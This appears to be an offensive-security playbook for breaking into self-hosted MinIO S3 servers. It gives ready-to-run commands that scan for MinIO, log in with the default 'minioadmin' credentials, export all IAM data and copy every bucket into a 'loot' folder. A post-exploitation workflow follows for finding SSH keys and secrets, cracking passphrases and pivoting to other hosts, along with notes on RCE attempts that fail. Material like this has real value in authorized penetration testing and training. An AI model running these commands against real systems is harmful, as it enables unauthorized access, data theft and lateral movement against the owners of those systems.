# AWS / MinIO — Self-Hosted S3 Exploitation

## When this applies

- Target runs MinIO (or compatible self-hosted S3) on a non-standard port (9000, 9001, 54321, 8333).
- Default credentials `minioadmin:minioadmin` accepted.
- Goal: list / download buckets containing SSH keys, database backups, configs.

## Technique

Discover MinIO via `/minio/health/live` endpoint. Configure `mc` client with default or discovered credentials. Enumerate hidden buckets like `internal`, `backups`. Download SSH keys / configs and pivot.

## Steps

### Discovery

```bash
# Discover MinIO service (scan alternate ports)
for port in 9000 9001 54321 8333; do
  curl -s -o /dev/null -w "%{http_code}" "http://target:$port/minio/health/live" && echo " → MinIO on port $port"
done

# Configure MinIO client (mc) with discovered/default credentials
mc alias set target http://target:9000 minioadmin minioadmin

# Full admin info (if root credentials work)
mc admin info target

# Export all IAM data (users, policies, buckets)
mc admin cluster iam export target

# List all buckets (including hidden ones like "internal")
mc ls target

# Recursively list bucket contents
mc ls --recursive target/bucket-name

# Download entire bucket
mc cp --recursive target/bucket-name/ ./loot/
```

### Common findings

- **Hidden buckets** — buckets named `internal`, `backups`, `private`, `admin` may contain SSH keys, database dumps, home directory archives
- **SSH keys in backups** — look for `.ssh/` directories, `id_rsa`, `id_ed25519` in tar/zip archives
- **Unauthenticated PUT via nginx proxy** — if MinIO sits behind nginx, the proxy may allow unauthenticated PUT requests to upload files

### What does NOT work for RCE on MinIO

These are common dead ends — do not waste time on them:
- **`mc admin update`** — MinIO validates binary signatures with a hardcoded minisign public key; cannot upload a malicious binary
- **`mc admin service restart`** — uses `syscall.Exec` (same PID), systemd does not notice the restart, startup scripts do not re-run
- **`mc admin service stop`** — clean exit (code 0), `Restart=on-failure` in systemd does not trigger a restart
- **Path traversal in S3 object keys** — MinIO blocks `..` in keys (`XMinioInvalidResourceName`); URL-encoded `%2e%2e` creates literal directories, not traversal
- **Environment variable injection via `mc admin config`** — not supported

### Post-exploitation workflow

1. **List and download all buckets** — especially hidden/internal ones
2. **Search for credentials** — SSH keys, `.env` files, database configs, API keys
3. **Crack SSH key passphrases** — if keys are encrypted
4. **Pivot via SSH** — use recovered keys to access the host or other systems
5. **Read systemd service files** — `cat /etc/systemd/system/minio.service` reveals environment variables, startup flags, `Restart=` policy

## Verifying success

- `mc admin info target` returns cluster details — root creds confirmed.
- `mc ls target/internal` lists object keys.
- Recovered SSH key authenticates to a host.

## Common pitfalls

- Default `minioadmin:minioadmin` may have been changed — also try the cluster's vendor's defaults (e.g., specific SaaS images set their own).
- MinIO over TLS (port 9001) requires `https://` and may have self-signed certs (use `--insecure`).
- `mc` requires write access to its config (`~/.mc/config.json`).

## Tools

- mc (MinIO client)
- AWS CLI with `--endpoint-url`
- s3cmd
- boto3 with `endpoint_url`
